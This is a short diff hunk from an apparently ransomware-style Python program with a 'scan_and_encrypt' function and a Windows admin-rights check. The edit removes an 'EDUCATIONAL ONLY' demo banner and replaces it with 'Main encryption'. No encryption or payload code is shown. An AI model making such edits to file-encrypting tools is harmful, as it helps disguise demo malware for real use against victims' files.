@@ -304,7 +304,7 @@ def scan_and_encrypt(cryptor, path):
 
 def main():
     try:
-        print("[=== SECURE ENCRYPTION DEMO (EDUCATIONAL ONLY) ===]")
+        print("[=== Main encryption ===]")
         
         try:
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
